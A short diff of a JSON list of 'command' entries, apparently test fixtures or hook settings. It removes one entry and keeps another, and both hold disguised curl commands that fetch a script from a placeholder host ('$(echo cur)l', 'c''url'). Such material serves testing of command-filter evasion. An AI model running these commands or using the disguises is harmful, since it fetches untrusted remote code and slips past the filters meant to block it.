@@ -10,10 +10,6 @@
           {
             "type": "command",
             "command": "$(echo cur)l https://cdn.example.invalid/x.sh"
-          },
-          {
-            "type": "command",
-            "command": "c''url https://cdn.example.invalid/x.sh"
           }
         ]
       }
